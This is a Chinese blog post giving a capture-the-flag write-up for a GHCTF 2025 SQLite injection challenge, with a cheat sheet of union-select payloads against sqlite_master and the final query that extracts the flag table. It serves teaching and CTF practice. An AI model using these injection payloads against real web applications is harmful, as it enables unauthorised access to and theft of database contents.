---
layout: post
title: "GHCTF-2025SQL-sqlite注入"
date: 2025-03-10 21:57:51 +0800
description: "查看版本：sqlite_version()列出附加数据库中的所有表：.tables。"
keywords: "[GHCTF 2025]SQL??? 【sqlite注入】"
categories: ['Sql']
tags: ['数据库', 'Sql']
artid: "146164505"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146164505
    alt: "GHCTF-2025SQL-sqlite注入"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146164505
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146164505
cover: https://bing.ee123.net/img/rand?artid=146164505
image: https://bing.ee123.net/img/rand?artid=146164505
img: https://bing.ee123.net/img/rand?artid=146164505
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     [GHCTF 2025]SQL??? 【sqlite注入】
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2>
     梳理一下SQLite注入
    </h2>
    <h4>
     常见指令
    </h4>
    <p>
     查看版本：sqlite_version()
    </p>
    <p>
     列出附加数据库中的所有表：.tables
    </p>
    <h4>
     注入步骤
    </h4>
    <p>
     <strong>
      先查字段：
     </strong>
    </p>
    <pre><code class="language-sql">1' order by 5 #</code></pre>
    <p>
     <strong>
      三板斧：
     </strong>
    </p>
    <pre><code class="language-sql">
0' union select 1,2,sql from sqlite_master;
sql字段存储创建该数据库对象时所使用的 SQL 语句，也就是说可以看见这个表是怎么被创建的

0' union select 1,2,sql from sqlite_master where type='table';
这里的type为table，也就是说只关注类型为表的内容，也就是说只关注表


0' union select 1,2,sql from sqlite_master where type='table' and name='user_data';
这里的name限制了要搜查的表的内容中，名字叫user_data的那个</code></pre>
    <h4>
     <code>
      sqlite_master
     </code>
     表的具体结构
    </h4>
    <table>
     <thead>
      <tr>
       <th>
        列名
       </th>
       <th>
        数据类型
       </th>
       <th>
        描述
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        <code>
         type
        </code>
       </td>
       <td>
        TEXT
       </td>
       <td>
        <span style="background-color:#c7e6ea">
         表示数据库对象的类型。
        </span>
        常见的值有：
        <br/>
        -
        <code>
         'table'
        </code>
        ：代表普通的表。
        <br/>
        -
        <code>
         'index'
        </code>
        ：代表索引，用于提高查询效率。
        <br/>
        -
        <code>
         'view'
        </code>
        ：代表视图，是虚拟表，基于 SQL 查询结果。
        <br/>
        -
        <code>
         'trigger'
        </code>
        ：代表触发器，是与表相关的特殊程序，在特定事件发生时自动执行。
       </td>
      </tr>
      <tr>
       <td>
        <code>
         name
        </code>
       </td>
       <td>
        TEXT
       </td>
       <td>
        <span style="background-color:#c7e6ea">
         存储数据库对象的名称。
        </span>
        比如，如果是表，就是表名；如果是索引，就是索引名，依此类推。
       </td>
      </tr>
      <tr>
       <td>
        <code>
         tbl_name
        </code>
       </td>
       <td>
        TEXT
       </td>
       <td>
        <span style="background-color:#c7e6ea">
         该列存储与该对象关联的表的名称。
        </span>
        对于表本身而言，
        <code>
         tbl_name
        </code>
        通常和
        <code>
         name
        </code>
        是相同的；但对于索引、视图和触发器，它指向它们所关联的表。例如，一个索引是为
        <code>
         users
        </code>
        表创建的，那么
        <code>
         tbl_name
        </code>
        就是
        <code>
         'users'
        </code>
        。
       </td>
      </tr>
      <tr>
       <td>
        <code>
         rootpage
        </code>
       </td>
       <td>
        INTEGER
       </td>
       <td>
        此列存储该对象数据存储的页号。在 SQLite 中，数据是按页存储的。不过对于某些对象（像视图），该值可能为 0，因为视图并不实际存储数据，只是一个查询定义。
       </td>
      </tr>
      <tr>
       <td>
        <code>
         sql
        </code>
       </td>
       <td>
        TEXT
       </td>
       <td>
        <span style="background-color:#c7e6ea">
         存储创建该数据库对象时所使用的 SQL 语句。
        </span>
        这个语句非常有用，因为它可以用来重新创建该对象。例如，如果你想知道一个表是如何创建的，就可以查看这个表对应的
        <code>
         sql
        </code>
        列的值。
       </td>
      </tr>
     </tbody>
    </table>
    <h2>
     题目
    </h2>
    <p>
     这张是我见过最好看的灰原哀了
    </p>
    <p>
     <img alt="" height="1369" src="https://i-blog.csdnimg.cn/direct/86ce63c1a1c94a18a76910edb9cae4a4.png" width="2488"/>
    </p>
    <p>
     注入show databases发现报错了直接
    </p>
    <p>
     <img alt="" height="193" src="https://i-blog.csdnimg.cn/direct/41a24a603a2c4a7e8f6141ced7e6bd1f.png" width="2243"/>
    </p>
    <p>
     又因为show databases只在MySQL中存在，但是在SQLite中无法使用，所以这道题是SQLite注入
    </p>
    <p>
     先判断有几列
    </p>
    <p>
     <img alt="" height="972" src="https://i-blog.csdnimg.cn/direct/f66fa08137004abb8026fb6d24235209.png" width="1612">
      第六列出现报错界面
      <img alt="" height="291" src="https://i-blog.csdnimg.cn/direct/ecf47f08a7ed433aaefce3be77f1cf2a.png" width="1774"/>
     </img>
    </p>
    <p>
     爆出来表名
    </p>
    <blockquote>
     <p>
      <code>
       sqlite_master
      </code>
      是 SQLite 中的一个系统表，它存储了数据库中所有对象（如表、视图、索引等）的定义信息。攻击者通过这个函数可以获取数据库中所有对象的名称。
     </p>
    </blockquote>
    <p>
     在name这一列中是所包含的表的名字，也就是flag和users
    </p>
    <p>
     <img alt="" height="958" src="https://i-blog.csdnimg.cn/direct/b04e321798db4749832142c10674e44b.png" width="1896"/>
    </p>
    <pre><code class="language-sql">/?id=1 union select 1,2,3,4,group_concat(sql) from sqlite_master</code></pre>
    <table>
     <tbody>
      <tr>
       <td>
        <span style="color:#be191c">
         <strong>
          <code>
           group_concat(sql)
          </code>
         </strong>
        </span>
       </td>
       <td>
        聚合
        <code>
         sqlite_master
        </code>
        表中所有表的
        <code>
         <strong>
          SQL
         </strong>
         定义语句
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         sqlite_master
        </code>
       </td>
       <td>
        SQLite系统表，记录所有用户表的定义信息（相当于MySQL的
        <code>
         information_schema
        </code>
        ）
       </td>
      </tr>
     </tbody>
    </table>
    <p>
     <img alt="" height="342" src="https://i-blog.csdnimg.cn/direct/4d62b3ff16454f2d8f65c650d0d2edd5.png" width="776"/>
    </p>
    <p>
     <img alt="" height="1084" src="https://i-blog.csdnimg.cn/direct/aae348db05be44a782d2731e1bdc8876.png" width="1943"/>
    </p>
    <p>
     返回的内容别看他这么乱，实际上长这样：
    </p>
    <p>
     <img alt="" height="318" src="https://i-blog.csdnimg.cn/direct/084b02ba048b45bca4379daed7998887.png" width="456"/>
    </p>
    <p>
     所以我们要找的就是flag表里的flag列
    </p>
    <p>
     所以直接payload：
    </p>
    <pre><code class="language-sql">/?id=1 union select 1,2,3,4,flag from flag</code></pre>
    <p>
     <img alt="" height="967" src="https://i-blog.csdnimg.cn/direct/26de8d31fd924d959eb1c7e3d75c3ed6.png" width="1499"/>
    </p>
    <p>
     拿到flag
    </p>
    <p>
    </p>
    <p>
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323430315f38363139303134362f:61727469636c652f64657461696c732f313436313634353035" class_="artid" style="display:none">
 </p>
</div>


